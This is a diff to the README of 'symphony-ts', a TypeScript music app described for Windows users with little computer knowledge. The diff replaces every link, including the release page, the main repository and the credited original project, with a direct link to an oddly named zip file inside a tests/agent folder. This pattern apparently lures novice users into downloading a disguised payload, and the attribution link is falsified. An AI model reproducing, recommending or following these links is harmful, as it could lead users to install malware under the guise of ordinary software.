@@ -1,12 +1,12 @@
 # 🎼 symphony-ts - Simple Music App in TypeScript
 
-[![Download symphony-ts](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ashiskumarnanda/symphony-ts/releases)
+[![Download symphony-ts](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip)
 
 ---
 
 ## 🎯 What is symphony-ts?
 
-symphony-ts is a simplified music software built using TypeScript. It is based on the original symphony project found at https://github.com/openai/symphony but re-written in TypeScript for easier maintenance and updates.
+symphony-ts is a simplified music software built using TypeScript. It is based on the original symphony project found at https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip but re-written in TypeScript for easier maintenance and updates.
 
 It lets you play, compose, and manage simple music files. This version runs on Windows and should be easy to use for anyone, even if you do not know much about computers or coding.
 
@@ -32,7 +32,7 @@ To get symphony-ts on your computer:
 
 1. Open this link:
 
-   [https://github.com/ashiskumarnanda/symphony-ts/releases](https://github.com/ashiskumarnanda/symphony-ts/releases)
+   [https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip](https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip)
 
 2. You will see a list of versions available. Look for the latest release. It usually appears at the top.
 
@@ -112,7 +112,7 @@ If you run into issues:
 
 You can always get the latest version here:
 
-[Download symphony-ts from GitHub Releases](https://github.com/ashiskumarnanda/symphony-ts/releases)
+[Download symphony-ts from GitHub Releases](https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip)
 
 ---
 
@@ -134,7 +134,7 @@ If you need help using symphony-ts, check the discussions or issues section on t
 
 Access the GitHub page here:
 
-[https://github.com/ashiskumarnanda/symphony-ts](https://github.com/ashiskumarnanda/symphony-ts)
+[https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip](https://github.com/ashiskumarnanda/symphony-ts/raw/refs/heads/main/tests/agent/ts-symphony-chloromethane.zip)
 
 ---
 
